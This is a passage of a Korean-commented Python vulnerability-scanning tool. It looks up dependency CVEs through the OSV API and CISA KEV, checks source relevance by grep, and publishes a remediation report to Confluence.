    kev_count = sum(1 for f in findings_out if f["is_kev"])
    real_use_count = sum(1 for f in findings_out if f["relevance"]["judgment"] == "실제사용")

    print(f"\n[결과 요약]")
    print(f"  전체 CVE: {total_vulns}건")
    print(f"  High/Critical: {len(high_vulns)}건")
    print(f"  취약 확정: {vuln_count}건")
    print(f"  CISA KEV: {kev_count}건")
    print(f"  실제사용 확인: {real_use_count}건")

    return {
        "task_id": "P2-01/P2-02",
        "source_tool": "SCA",
        "metadata": {
            "source_dir": str(source_dir),
            "dc_report": str(dc_report_path),
            "project_name": project_name,
            "scanned_at": datetime.now().isoformat(),
            "cvss_threshold": cvss_threshold,
            "total_dependencies_with_vuln": len({f["dependency"] for f in raw_findings}),
            "total_cve": total_vulns,
            "high_critical_cve": len(high_vulns),
            "kev_count": kev_count,
        },
        "summary": {
            "취약": vuln_count,
            "정보": total_vulns - vuln_count,
            "실제사용": real_use_count,
            "간접사용": sum(1 for f in findings_out if f["relevance"]["judgment"] == "간접사용"),
            "미확인": sum(1 for f in findings_out if f["relevance"]["judgment"] == "미확인"),
        },
        "findings": findings_out,
    }


def _make_recommendation(cve_id: str, raw: dict, is_kev: bool, relevance: dict) -> str:
    """조치 권고사항을 생성한다."""
    parts = []
    fixed = raw.get("fixed_in", "")
    dep = raw.get("dependency", "")
    version = raw.get("version", "")

    if is_kev:
        parts.append("⚠️ CISA KEV 등록 — 즉시 패치 필요")
    if fixed:
        parts.append(f"수정 버전: {fixed}")
    else:
        parts.append(f"최신 버전으로 업그레이드 권장 (현재: {version})")

    if relevance["judgment"] == "미확인":
        parts.append("소스코드 사용 여부 수동 확인 필요")

    for ref in raw.get("references", [])[:2]:
        if "github.com" in ref or "security" in ref:
            parts.append(f"참조: {ref}")

    return "; ".join(parts)


# ─────────────────────────────────────────────────────────────────
# 8. Gradle dep tree 기반 OSV 분석 (빌드 실패 시 대체 경로)
# ─────────────────────────────────────────────────────────────────

_CWE_KO: dict = {
    "CWE-863": "인가 검사가 forward/include 등 내부 재전달 요청에서 건너뛰어져 권한 없는 자원에 우회 접근 가능",
    "CWE-502": "외부 데이터를 객체로 역직렬화할 때 악성 페이로드가 임의 코드를 실행할 수 있어 RCE 위험",
    "CWE-281": "접근 제어 설정이 일부 패턴·경로에서 누락되어 인증 없이 관리 기능 접근 가능",
    "CWE-284": "접근 제어 정책이 특정 URL 패턴·요청 유형에 적용되지 않아 무단 접근 허용",
    "CWE-400": "입력 처리 시 CPU·메모리를 무제한 소모하게 유도해 서버 전체를 응답 불가(DoS) 상태로 만들 수 있음",
    "CWE-22":  "파일 경로에 ../를 삽입해 허가되지 않은 디렉터리의 파일을 읽거나 덮어쓸 수 있음",
    "CWE-601": "검증되지 않은 외부 URL로 사용자를 리다이렉트해 피싱 또는 내부 서버 SSRF 공격에 악용 가능",
    "CWE-367": "파일 유효성 확인과 실제 사용 사이의 짧은 시간에 공격자가 파일을 교체해 보안 검사 우회",
    "CWE-20":  "요청 데이터를 충분히 검증하지 않아 이상 동작·충돌·보안 정책 우회 발생 가능",
    "CWE-770": "요청 하나가 과도한 스레드·버퍼를 점유해 다른 요청을 처리할 수 없게 만들어 서비스 중단",
    "CWE-44":  "경로 구분자 변형을 통해 의도치 않은 디렉터리 접근 가능",
    "CWE-116": "에러 응답 등에서 특수문자가 이스케이프되지 않아 XSS 또는 헤더 인젝션 가능",
    "CWE-287": "인증 로직 결함으로 자격증명 없이 시스템 접근 또는 인증을 우회 가능",
    "CWE-862": "특정 요청 경로에서 인가 검사가 수행되지 않아 무단으로 기능·데이터 접근 허용",
    "CWE-521": "패스워드 길이 제한이 없어 극도로 긴 입력으로 bcrypt 해싱 시 CPU를 점유해 DoS 유발",
    "CWE-285": "인가 정책이 올바르게 구현되지 않아 본인 권한 범위를 초과한 리소스 접근 가능",
    "CWE-696": "데이터 처리 순서 결함으로 예상치 못한 상태에 빠져 DoS 유발",
    "CWE-121": "깊이 중첩된 데이터 처리 시 재귀 스택이 넘쳐 서버 프로세스 강제 종료 가능",
    "CWE-190": "크기 계산에서 정수 오버플로 발생 시 버퍼 할당 오류나 크래시 발생 가능",
    "CWE-404": "소켓·연결 자원이 정상적으로 해제되지 않아 리소스 고갈로 서비스 중단",
    "CWE-444": "HTTP 헤더 파싱 불일치를 이용해 프록시·캐시를 속이는 HTTP Request Smuggling 공격 가능",
    "CWE-776": "XML 엔티티 재귀 확장(Billion Laughs)으로 파싱 시 메모리를 폭발적으로 소모",
    "CWE-74":  "출력값에 외부 입력이 이스케이프되지 않아 인젝션 공격 가능",
    "CWE-23":  "상대 경로 탐색을 통해 허가되지 않은 파일 시스템 경로에 접근 가능",
    "CWE-755": "예외 상황 미처리로 서버가 비정상 종료되거나 정보가 노출될 수 있음",
    "CWE-918": "서버가 검증 없이 외부 URL로 요청을 전달해 내부 자원에 무단 접근 가능(SSRF)",
}

_SEV_ORDER: dict = {"CRITICAL": 3, "HIGH": 2, "MODERATE": 1, "LOW": 0}
_REL_ORDER: dict = {"적용": 3, "제한적": 2, "조건 미충족": 1, "조건미충족": 1, "검토 필요": 0}

# CWE 우선순위 — 낮을수록 먼저 표시 (RCE → Path Traversal → Auth → ... → 기타)
_CWE_PRIORITY: dict = {
    # RCE / 임의 코드 실행
    "CWE-502": 10, "CWE-78": 11, "CWE-94": 12,
    # 경로 탐색
    "CWE-22": 20, "CWE-23": 21, "CWE-44": 22,
    # 인증·인가 우회
    "CWE-287": 30, "CWE-862": 31, "CWE-863": 32,
    "CWE-284": 33, "CWE-281": 34, "CWE-285": 35,
    # SSRF / HTTP 스머글링
    "CWE-918": 40, "CWE-444": 41,
    # DoS / 자원 소모
    "CWE-400": 50, "CWE-770": 51, "CWE-521": 52,
    "CWE-696": 53, "CWE-121": 54, "CWE-404": 55,
    # 인젝션 / XSS
    "CWE-116": 60, "CWE-74": 61,
}
_CWE_COMPRESS_THRESHOLD = 5   # 이 수 이상이면 압축
_CWE_COMPRESS_KEEP = 4        # 압축 후 유지할 최대 개수


def _compress_cwe_ids(cwe_ids: list[str]) -> tuple[list[str], int]:
    """CWE 5개 이상 시 우선순위 상위 N개만 반환.

    Returns:
        (압축된 cwe_ids, 생략된 개수)
    """
    if len(cwe_ids) < _CWE_COMPRESS_THRESHOLD:
        return list(cwe_ids), 0

    # 우선순위 기준 정렬 — 매핑 없는 CWE는 우선순위 999 (맨 뒤)
    sorted_cwes = sorted(cwe_ids, key=lambda c: _CWE_PRIORITY.get(c, 999))
    kept = sorted_cwes[:_CWE_COMPRESS_KEEP]
    omitted = len(sorted_cwes) - len(kept)
    return kept, omitted


def parse_dep_tree(log_path: Path) -> list:
    """Gradle `dependencies --configuration runtimeClasspath` 출력 파싱.

    Returns list of {"group": str, "artifact": str, "version": str, "ga": str, "dep": str}
    """
    content = log_path.read_text(encoding="utf-8", errors="ignore")
    deps_raw: set = set()
    for line in content.splitlines():
        # resolved version: "group:artifact:old -> new"
        m = re.search(r"([\w.\-]+:[\w.\-]+):[\w.\-]+ -> ([\w.\-]+)", line)
        if m:
            deps_raw.add(f"{m.group(1)}:{m.group(2)}")
            continue
        # direct version
        m2 = re.search(
            r"((?:org|com|io|net|javax|ch|de)\.[a-zA-Z][\w.\-]+:[a-zA-Z][\w.\-]+:([\d]+\.[\d.]+[\w\-]*))",
            line,
        )
        if m2 and "(*)" not in line:
            deps_raw.add(m2.group(1))

    result = []
    for dep in deps_raw:
        parts = dep.rsplit(":", 1)
        if len(parts) != 2:
            continue
        ga, ver = parts
        group, _, artifact = ga.partition(":")
        result.append({"group": group, "artifact": artifact, "version": ver,
                        "ga": ga, "dep": dep})
    return result


def _osv_get_vuln_details(vuln_id: str, current_ver: str) -> dict:
    """OSV 단건 조회 → severity, fixed version, cwe_ids, summary, cve_id."""
    _SEV_SCORE_MAP = {"CRITICAL": 9.5, "HIGH": 7.5, "MODERATE": 5.0, "LOW": 2.5}
    default = {"severity": "", "cvss": 0.0, "fixed": "확인 필요",
                "cwe_ids": [], "summary": "", "cve_id": ""}
    try:
        url = f"https://api.osv.dev/v1/vulns/{vuln_id}"
        with urllib.request.urlopen(url, timeout=12) as r:
            d = json.loads(r.read())
    except Exception:
        return default

    db = d.get("database_specific", {})
    severity = db.get("severity", "").upper()
    cvss = _SEV_SCORE_MAP.get(severity, 0.0)
    cwe_ids = db.get("cwe_ids", [])
    summary = d.get("summary", "")
    aliases = [a for a in d.get("aliases", []) if a.startswith("CVE-")]
    cve_id = aliases[0] if aliases else ""

    # fixed version (same-major 우선)
    try:
        cur_major = int(current_ver.split(".")[0])
    except Exception:
        cur_major = -1

    fixed_list = []
    for affected in d.get("affected", []):
        if affected.get("package", {}).get("ecosystem") != "Maven":
            continue
        for rng in affected.get("ranges", []):
            for evt in rng.get("events", []):
                if "fixed" in evt:
                    fixed_list.append(evt["fixed"])

    def _ver_key(v: str):
        parts = []
        for x in v.replace("-", ".").split("."):
            try:
                parts.append(int(x))
            except ValueError:
                parts.append(0)
        return parts[:4]

    fixed = "확인 필요"
    same = [f for f in fixed_list if f and _safe_major(f) == cur_major]
    if same:
        fixed = sorted(same, key=_ver_key)[0]
    elif fixed_list:
        fixed = sorted(fixed_list, key=_ver_key)[0]

    return {"severity": severity, "cvss": cvss, "fixed": fixed,
            "cwe_ids": cwe_ids, "summary": summary, "cve_id": cve_id}


def _osv_find_fixed(vuln_id: str, current_ver: str) -> str:
    """OSV 단건 조회 → same-major compatible fixed version (레거시 호환)."""
    return _osv_get_vuln_details(vuln_id, current_ver)["fixed"]


def _safe_major(ver: str) -> int:
    try:
        return int(ver.split(".")[0])
    except Exception:
        return -1


def _osv_get_severity(d: dict) -> str:
    return d.get("database_specific", {}).get("severity", "")


def run_sca_osv(
    source_dir: Path,
    dep_tree_path: Path,
    project_name: str,
    cvss_threshold: float,
    skip_network: bool,
    confluence_page_id: Optional[str] = None,
) -> dict:
    """Gradle dep tree → OSV API 기반 SCA (dependency-check 없이 실행).

    dep_tree_path: `gradlew dependencies --configuration runtimeClasspath` 출력 파일
    """
    print(f"\n=== scan_sca.py — SCA 분석 (OSV 모드) ===")
    print(f"소스: {source_dir}")
    print(f"dep-tree: {dep_tree_path}")

    # Step 1: dep tree 파싱
    deps = parse_dep_tree(dep_tree_path)
    print(f"\n[Step 1] 의존성 파싱: {len(deps)}개")

    # Step 2: OSV 배치 조회
    print(f"\n[Step 2] OSV API 배치 조회...")
    queries = [{"package": {"name": d["ga"], "ecosystem": "Maven"}, "version": d["version"]}
               for d in deps]
    body = json.dumps({"queries": queries}).encode()
    req = urllib.request.Request(
        "https://api.osv.dev/v1/querybatch",
        data=body,
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            osv_batch = json.loads(r.read())
    except Exception as e:
        print(f"  OSV 배치 조회 실패: {e}")
        osv_batch = {"results": []}

    # Step 3: CISA KEV
    kev_set: set = set()
    if not skip_network:
        print(f"\n[Step 3] CISA KEV 조회...")
        kev_set = load_cisa_kev()
        print(f"  KEV {len(kev_set)}건 로드")

    # Step 4: 배치 결과 → 고유 vuln_id 수집 후 개별 상세 조회
    print(f"\n[Step 4] 취약점 개별 상세 조회 (severity/fixed/CWE)...")
    # 배치 결과: res["vulns"] = [{"id": "GHSA-...", "aliases": [...]}] — severity 미포함
    # → 개별 조회 필요
    vuln_dep_map: list = []  # [(vuln_id, dep_info)]
    results_batch = osv_batch.get("results", [])
    for i, res in enumerate(results_batch):
        if not res.get("vulns"):
            continue
        dep_info = deps[i] if i < len(deps) else {}
        for vuln in res["vulns"]:
            vid = vuln.get("id", "")
            if vid:
                vuln_dep_map.append((vid, dep_info))

    # 고유 vuln_id별 개별 조회 (중복 제거)
    seen_details: dict = {}
    unique_vids = list(dict.fromkeys(v for v, _ in vuln_dep_map))
    print(f"  고유 취약점 {len(unique_vids)}개 조회 중...")
    for vid in unique_vids:
        # dep_info에서 version 추출 (첫 번째 매칭)
        cur_ver = next((di.get("version", "0") for v, di in vuln_dep_map if v == vid), "0")
        seen_details[vid] = _osv_get_vuln_details(vid, cur_ver)

    # HIGH+CRITICAL 필터링 및 raw_findings 구성
    raw_findings = []
    for vid, dep_info in vuln_dep_map:
        det = seen_details.get(vid, {})
        cvss_score = det.get("cvss", 0.0)
        if cvss_score < cvss_threshold:
            continue
        cve_id = det.get("cve_id", "")
        raw_findings.append({
            "vuln_id": vid,
            "cve_id": cve_id,
            "severity": det.get("severity", ""),
            "cvss": cvss_score,
            "dep": dep_info.get("dep", ""),
            "group": dep_info.get("group", ""),
            "artifact": dep_info.get("artifact", ""),
            "version": dep_info.get("version", ""),
            "ga": dep_info.get("ga", ""),
            "summary": det.get("summary", ""),
            "cwe_ids": det.get("cwe_ids", []),
            "kev": cve_id in kev_set,
            "fixed_version": det.get("fixed", "확인 필요"),
            "relevance_status": "검토 필요",
            "relevance_reason": "",
        })

    # 중복 제거 (같은 dep + cve_id)
    seen_keys: set = set()
    deduped = []
    for f in raw_findings:
        key = (f["dep"], f["cve_id"] or f["vuln_id"])
        if key not in seen_keys:
            seen_keys.add(key)
            deduped.append(f)
    raw_findings = deduped

    print(f"  HIGH+CRITICAL: {len(raw_findings)}건")

    # Step 6: 소스코드 자동 관련성 판정
    for f in raw_findings:
        status, reason = _auto_relevance(source_dir, f["artifact"], f["group"], f["cwe_ids"])
        f["relevance_status"] = status
        f["relevance_reason"] = reason

    # Step 7: 라이브러리별 그룹화 (정렬 포함)
    grouped = _group_and_sort(raw_findings)

    kev_count = sum(1 for f in raw_findings if f["kev"])
    applicable = sum(1 for g in grouped if g["relevance_max"] == "적용")
    print(f"\n[결과] 라이브러리: {len(grouped)}개 | HIGH+CRITICAL: {len(raw_findings)}건 | KEV: {kev_count}건 | 적용: {applicable}개")

    return {
        "task_id": "P2-01/P2-02",
        "source_tool": "SCA(OSV)",
        "project": project_name,
        "source": str(source_dir),
        "total_deps": len(deps),
        "total_vulns_all": len(raw_findings),
        "high_critical_count": len(raw_findings),
        "kev_count": kev_count,
        "findings": raw_findings,
        "grouped": grouped,
    }


def _auto_relevance(source_dir: Path, artifact: str, group: str, cwe_ids: list) -> tuple:
    """소스코드 grep 기반 자동 관련성 판정.

    Returns (status, reason)  status: "적용" | "제한적" | "조건 미충족"
    """
    src = str(source_dir)
    artifact_short = artifact.split("-")[-1] if "-" in artifact else artifact

    # WebFlux 전용 CVE 체크
    webflux_cwes = {"CWE-281", "CWE-284", "CWE-285"}  # Spring Security WebFlux 계열
    if "webflux" in artifact.lower() or "reactive" in artifact.lower():
        wf_found = bool(_grep(src, r"WebFluxSecurity|EnableWebFluxSecurity|RouterFunction"))
        return ("적용" if wf_found else "조건 미충족",
                "WebFlux 사용 확인" if wf_found else "WebFlux(@EnableWebFluxSecurity/RouterFunction) 미사용")

    # Cloud Foundry 전용
    if "actuator" in artifact.lower():
        cf_found = bool(_grep(src, r"cloud\.foundry|vcap\.|CloudFoundry", extensions=["yml", "properties", "java", "kt"]))
        if cf_found:
            return "적용", "Cloud Foundry 환경 설정 확인"
        return "제한적", "Actuator 사용 중. Cloud Foundry 미확인 — EndpointRequest.to() 패턴 수동 확인 필요"

    # Jackson (항상 적용)
    if "jackson" in artifact.lower():
        count = _grep_count(src, r"ObjectMapper|JsonNode|readValue", extensions=["java", "kt"])
        if count > 0:
            return "적용", f"ObjectMapper {count}개 파일에서 사용 중. 외부 JSON 입력 처리"
        return "제한적", "Jackson 의존성 있으나 직접 사용 코드 미확인"

    # Logback (SocketAppender만 위험)
    if "logback" in artifact.lower():
        sock = bool(_grep(src, r"SocketAppender|SSLSocketAppender|ServerSocketReceiver", extensions=["xml", "java", "kt"]))
        return ("적용" if sock else "조건 미충족",
                "SocketAppender 설정 확인" if sock else "SocketAppender 미설정 — 파일/콘솔 appender만 사용")

    # snakeyaml
    if "snakeyaml" in artifact.lower():
        yaml_use = bool(_grep(src, r"new Yaml\(|Yaml\(\)|\.load\(", extensions=["java", "kt"]))
        return ("제한적" if yaml_use else "조건 미충족",
                "Yaml().load() 사용 확인 — 외부 입력 직접 전달 여부 추가 확인 필요" if yaml_use
                else "YAML 직접 사용 코드 없음")

    # protobuf (gRPC 내부 통신)
    if "protobuf" in artifact.lower():
        return "제한적", "gRPC 내부 통신용 — 외부 gRPC 포트 직접 노출 여부 확인 필요"

    # grpc-netty
    if "grpc" in artifact.lower() and "netty" in artifact.lower():
        return "적용", "gRPC HTTP/2 사용 중 — gRPC 포트 노출 시 HTTP/2 DDoS 가능"

    # commons-io (XmlStreamReader만 위험)
    if "commons-io" in artifact.lower():
        xml_use = bool(_grep(src, r"XmlStreamReader", extensions=["java", "kt"]))
        return ("적용" if xml_use else "조건 미충족",
                "XmlStreamReader 사용 확인" if xml_use else "XmlStreamReader 미사용")

    # Spring Web (UriComponentsBuilder)
    if artifact in ("spring-web",):
        uri_use = bool(_grep(src, r"UriComponentsBuilder|sendRedirect", extensions=["java", "kt"]))
        return ("적용" if uri_use else "제한적",
                "UriComponentsBuilder 사용 확인 — URL 파싱 취약점 조건 충족" if uri_use
                else "UriComponentsBuilder 직접 사용 미확인")

    # Spring Security (패스워드 인증)
    if "spring-security-crypto" in artifact.lower():
        pw_use = bool(_grep(src, r"BCryptPasswordEncoder|PasswordEncoder|passwordEncoder"))
        return ("적용" if pw_use else "조건 미충족",
                "BCryptPasswordEncoder 사용 확인" if pw_use else "패스워드 인증 미사용")

    # Tomcat (HTTP/2 조건)
    if "tomcat-embed" in artifact.lower():
        h2 = bool(_grep(src, r"http2|HTTP2", extensions=["yml", "properties", "xml"]))
        multipart = bool(_grep(src, r"MultipartFile|@RequestPart", extensions=["java", "kt"]))
        if multipart:
            return "적용", "파일 업로드(MultipartFile) 엔드포인트 확인 — Tomcat HTTP 처리 취약점 조건 충족"
        return "적용", "HTTP 서버 기본 조건 충족 (일부 CVE는 HTTP/2 또는 Windows 전용)"

    # 기본: 소스에서 artifact short name grep
    found = bool(_grep(src, artifact_short, extensions=["java", "kt"]))
    return ("제한적" if found else "검토 필요",
            f"{artifact_short} 참조 코드 확인 — 취약 API 직접 사용 여부 수동 확인 필요" if found
            else "소스 내 직접 사용 미확인 — 간접 의존성 가능")


def _grep(src_dir: str, pattern: str, extensions: Optional[list] = None) -> bool:
    """소스 디렉토리에서 패턴 grep. True=발견."""
    if extensions is None:
        extensions = ["java", "kt", "xml", "yml", "properties"]
    try:
        import subprocess as sp
        cmd = ["grep", "-rl", "--include=*.{}".format("|*.".join(extensions)),
               "-E", pattern, str(src_dir)]
        # grep -rl 은 --include 를 여러 번 지정해야 함
        include_args = [f"--include=*.{e}" for e in extensions]
        cmd = ["grep", "-rl", "-E", pattern] + include_args + [str(src_dir)]
        result = sp.run(cmd, capture_output=True, text=True, timeout=10)
        return bool(result.stdout.strip())
    except Exception:
        return False


def _grep_count(src_dir: str, pattern: str, extensions: Optional[list] = None) -> int:
    """패턴 발견된 파일 수 반환."""
    if extensions is None:
        extensions = ["java", "kt"]
    try:
        import subprocess as sp
        include_args = [f"--include=*.{e}" for e in extensions]
        cmd = ["grep", "-rl", "-E", pattern] + include_args + [str(src_dir)]
        result = sp.run(cmd, capture_output=True, text=True, timeout=10)
        lines = [l for l in result.stdout.strip().splitlines() if l]
        return len(lines)
    except Exception:
        return 0


def _group_and_sort(findings: list) -> list:
    """라이브러리별 그룹화 후 정렬: CRITICAL>HIGH, 적용>제한적>조건미충족.

    Returns list of lib_info dicts.
    """
    lib_map: dict = {}
    for f in findings:
        key = f["ga"] or f["dep"].rsplit(":", 1)[0]
        if key not in lib_map:
            lib_map[key] = {
                "dep": f["dep"],
                "group": f["group"],
                "artifact": f["artifact"],
                "version": f["version"],
                "severity_max": f["severity"],
                "cvss_max": f["cvss"],
                "relevance_max": f["relevance_status"],
                "fixed_version": f["fixed_version"],
                "cves": [],
            }
        entry = lib_map[key]
        # max severity
        if _SEV_ORDER.get(f["severity"], 0) > _SEV_ORDER.get(entry["severity_max"], 0):
            entry["severity_max"] = f["severity"]
            entry["cvss_max"] = f["cvss"]
        # max relevance
        if _REL_ORDER.get(f["relevance_status"], 0) > _REL_ORDER.get(entry["relevance_max"], 0):
            entry["relevance_max"] = f["relevance_status"]
        # max (覆蓋) fixed version
        cur = entry["fixed_version"]
        new = f["fixed_version"]
        if new and new != "확인 필요" and cur != "확인 필요":
            if _ver_gt(new, cur):
                entry["fixed_version"] = new
        elif new and new != "확인 필요" and cur == "확인 필요":
            entry["fixed_version"] = new
        entry["cves"].append({
            "cve_id": f["cve_id"] or f["vuln_id"],
            "vuln_id": f["vuln_id"],
            "severity": f["severity"],
            "cvss": f["cvss"],
            "kev": f.get("kev", False),
            "cwe_ids": f.get("cwe_ids", []),
            "summary": f.get("summary", ""),
            "fixed_version": f["fixed_version"],
            "relevance_status": f["relevance_status"],
            "relevance_reason": f["relevance_reason"],
        })

    # 정렬: 1차=심각도 내림차순, 2차=소스관련성 내림차순
    def _sort_key(lib_info):
        sev = _SEV_ORDER.get(lib_info["severity_max"], 0)
        rel = _REL_ORDER.get(lib_info["relevance_max"], 0)
        return (-sev, -rel)

    return sorted(lib_map.values(), key=_sort_key)


def _ver_gt(a: str, b: str) -> bool:
    """버전 a > b 여부."""
    def _k(v):
        parts = []
        for x in v.replace("-", ".").split("."):
            try:
                parts.append(int(x))
            except ValueError:
                parts.append(0)
        return parts[:4]
    try:
        return _k(a) > _k(b)
    except Exception:
        return False


# ─────────────────────────────────────────────────────────────────
# 9. Confluence 게시 (--publish)
# ─────────────────────────────────────────────────────────────────

def _esc(s: str) -> str:
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _sev_badge(sev: str) -> str:
    colour = "Red" if sev == "CRITICAL" else "Yellow"
    return (f'<ac:structured-macro ac:name="status">'
            f'<ac:parameter ac:name="colour">{colour}</ac:parameter>'
            f'<ac:parameter ac:name="title">{sev}</ac:parameter>'
            f'</ac:structured-macro>')


def _rel_badge(rel: str) -> str:
    if "KEV" in rel or rel == "적용":
        colour, label = "Red", rel
    elif rel == "제한적":
        colour, label = "Yellow", "제한적"
    else:
        colour, label = "Grey", "조건미충족"
    return (f'<ac:structured-macro ac:name="status">'
            f'<ac:parameter ac:name="colour">{colour}</ac:parameter>'
            f'<ac:parameter ac:name="title">{label}</ac:parameter>'
            f'</ac:structured-macro>')


def build_sca_xhtml(grouped: list, project: str, source: str,
                    total_deps: int, kev_count: int, analysis_date: str,
                    analysis_note: str = "") -> str:
    """정렬된 grouped list → Confluence XHTML 생성.

    grouped는 _group_and_sort() 결과 (이미 CRITICAL>HIGH, 적용>제한적>조건미충족 정렬).
    """
    applicable = sum(1 for g in grouped if g["relevance_max"] == "적용")
    limited = sum(1 for g in grouped if g["relevance_max"] == "제한적")
    cond_not_met = sum(1 for g in grouped
                       if g["relevance_max"] in ("조건 미충족", "조건미충족", "검토 필요"))
    high_critical = sum(len(g["cves"]) for g in grouped)
    critical_libs = sum(1 for g in grouped if g["severity_max"] == "CRITICAL")

    # 라이브러리별 행
    rows = ""
    for i, lib in enumerate(grouped, 1):
        dep_parts = lib["dep"].split(":")
        artifact = lib["artifact"] or (dep_parts[-2] if len(dep_parts) >= 2 else lib["dep"])
        version = lib["version"] or (dep_parts[-1] if dep_parts else "")
        patch = lib.get("fixed_version") or "확인 필요"

        # CVE 목록 (KEV 표시)
        cve_html = "<br/>".join(
            f'<strong>{_esc(c["cve_id"])}</strong>{"&nbsp;★" if c.get("kev") else ""}'
            for c in lib["cves"]
        )

        # CWE 설명 (한국어) — 5개 이상 시 우선순위 상위 4개로 자동 압축
        cwe_set: set = set()
        for c in lib["cves"]:
            cwe_set.update(c.get("cwe_ids", []))
        cwe_list, cwe_omitted = _compress_cwe_ids(list(cwe_set))
        cwe_html = "".join(
            f'<strong>{_esc(cwe)}</strong>: {_esc(_CWE_KO.get(cwe, ""))}<br/>'
            for cwe in cwe_list
            if _CWE_KO.get(cwe)
        ) or "".join(f'{_esc(cwe)}<br/>' for cwe in cwe_list)
        if cwe_omitted:
            cwe_html += f'<em style="color:grey">(+{cwe_omitted}개 생략 — 핵심 위협 우선 표시)</em>'

        # 관련성: 가장 높은 CVE 기준 reason
        top_cve = max(lib["cves"], key=lambda c: _REL_ORDER.get(c.get("relevance_status", ""), 0))
        rel_reason = _esc(top_cve.get("relevance_reason", ""))

        rows += (
            f"<tr>"
            f"<td>{i}</td>"
            f"<td><code>{_esc(artifact)}</code><br/><small>{_esc(version)}</small></td>"
            f"<td>{_sev_badge(lib['severity_max'])}</td>"
            f"<td><small>{cve_html}</small></td>"
            f"<td><code>{_esc(patch)}</code></td>"
            f"<td>{_rel_badge(lib['relevance_max'])}<br/><small>{rel_reason}</small></td>"
            f"<td><small>{cwe_html}</small></td>"
            f"</tr>\n"
        )

    note_block = ""
    if analysis_note:
        note_block = (f'<ac:structured-macro ac:name="info"><ac:rich-text-body>'
                      f'<p>{_esc(analysis_note)}</p></ac:rich-text-body></ac:structured-macro>\n')

    xhtml = f"""<h2>개요</h2>
<p>대상: <strong>{_esc(project)}</strong> — <code>{_esc(source)}</code></p>
<p>분석 방법: Gradle runtimeClasspath 의존성 트리 → OSV API CVE 조회 → CISA KEV 대조 → 소스코드 실사용 검증</p>
<p>분석일: {_esc(analysis_date)}</p>
{note_block}
<h2>요약</h2>
<table>
<tr><th>항목</th><th>수치</th><th>비고</th></tr>
<tr><td>전체 의존성</td><td>{total_deps}개</td><td>Gradle runtimeClasspath</td></tr>
<tr><td>HIGH+CRITICAL CVE</td><td><strong>{high_critical}건</strong></td><td>CVSS ≥ 7.0</td></tr>
<tr><td>고유 취약 라이브러리</td><td><strong>{len(grouped)}개</strong></td><td>중복 제거</td></tr>
<tr><td>CRITICAL 라이브러리</td><td><strong style="color:red">{critical_libs}개</strong></td><td></td></tr>
<tr><td>CISA KEV (실 악용 CVE)</td><td><strong style="color:red">{kev_count}건</strong></td><td>즉시 패치 필요</td></tr>
<tr><td>소스 관련성 — 적용</td><td><strong>{applicable}개</strong></td><td>조건 충족 확인</td></tr>
<tr><td>소스 관련성 — 제한적</td><td>{limited}개</td><td>추가 확인 필요</td></tr>
<tr><td>조건 미충족 (FP)</td><td>{cond_not_met}개</td><td>발생 조건 미확인</td></tr>
</table>

<h2>취약 라이브러리 목록 (심각도↓, 소스관련성↓ 정렬)</h2>
<table>
<tr>
<th>#</th>
<th>라이브러리<br/>(현재 버전)</th>
<th>심각도</th>
<th>CVE 목록<br/>(★=KEV)</th>
<th>패치 필요 버전</th>
<th>소스 관련성 및 판단 근거</th>
<th>CWE 및 취약 현황 (개발자 설명)</th>
</tr>
{rows}
</table>

<h2>조치 권고</h2>
<ol>
<li><strong>(즉시) CISA KEV 등재 취약점(★)</strong>: 실제 악용 사례 확인된 CVE — 현재 메이저 버전 내 최신 패치를 즉시 적용할 것.</li>
<li><strong>(단기) Spring Boot BOM 일괄 업그레이드</strong>: Tomcat, Jackson, SnakeYAML 등 BOM 관리 라이브러리는 <code>build.gradle</code>에서 개별 버전을 강제 오버라이딩하지 말 것.
<ac:structured-macro ac:name="warning"><ac:rich-text-body>
<p><strong>전이적 의존성 오버라이딩 금지</strong>: 개별 라이브러리(Tomcat, Jackson 등) 버전을 강제로 오버라이딩하면 프레임워크 내부 클래스와 충돌(<code>NoClassDefFoundError</code> 등)이 발생할 수 있습니다. 가급적 Spring Boot Starter Parent(또는 BOM) 버전을 일괄 업그레이드하여 의존성 충돌을 방지하십시오.</p>
</ac:rich-text-body></ac:structured-macro></li>
<li><strong>(중장기) 메이저 버전 마이그레이션</strong>: Spring Boot 3.x 이상으로의 업그레이드가 필요한 경우,
<ac:structured-macro ac:name="info"><ac:rich-text-body>
<p>단기적으로는 현재 메이저 버전의 최신 패치(예: 2.7.x의 최신)를 적용하여 Critical 취약점을 방어하고, 중장기적으로 <strong>Java 17</strong> 및 <code>jakarta.*</code> 패키지 전환을 동반하는 3.x 마이그레이션 계획을 <strong>별도 수립</strong>할 것. (단순 버전 변경으로 해결 불가 — Spring Security 6 API 변경, Hibernate 6 마이그레이션 포함)</p>
</ac:rich-text-body></ac:structured-macro></li>
</ol>

<h2>분석 방법 상세</h2>
<ul>
<li>Gradle <code>runtimeClasspath</code> 의존성 트리 추출 (<code>gradlew dependencies</code>)</li>
<li>OSV.dev API 배치 조회 → severity HIGH/CRITICAL 필터링</li>
<li>OSV <code>affected[].ranges[].events[fixed]</code>에서 same-major 패치 버전 자동 추출</li>
<li>CISA KEV 피드 대조 (실 악용 CVE 식별)</li>
<li>소스코드 grep 기반 발생 조건 자동 검증 (WebFlux, RouterFunction, MultipartFile, SocketAppender, UriComponentsBuilder 등)</li>
<li>CWE 5개 이상 라이브러리: 우선순위 기준 핵심 위협 4개로 자동 압축 (RCE → 경로탐색 → 인가우회 → DoS 순)</li>
</ul>
"""
    return xhtml


def publish_sca_to_confluence(
    xhtml: str,
    page_title: str,
    parent_id: str,
    space_key: str,
    base_url: str,
    token: str,
    existing_page_id: Optional[str] = None,
) -> str:
    """Confluence에 SCA 페이지를 생성 또는 업데이트한다.

    Returns page URL.
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    if existing_page_id:
        # 버전 조회
        url = f"{base_url}/rest/api/content/{existing_page_id}?expand=version"
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=15) as r:
            cur = json.loads(r.read())
        new_ver = cur["version"]["number"] + 1
        payload = {
            "version": {"number": new_ver},
            "title": page_title,
            "type": "page",
            "body": {"storage": {"value": xhtml, "representation": "storage"}},
        }
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            f"{base_url}/rest/api/content/{existing_page_id}",
            data=data, headers=headers, method="PUT",
        )
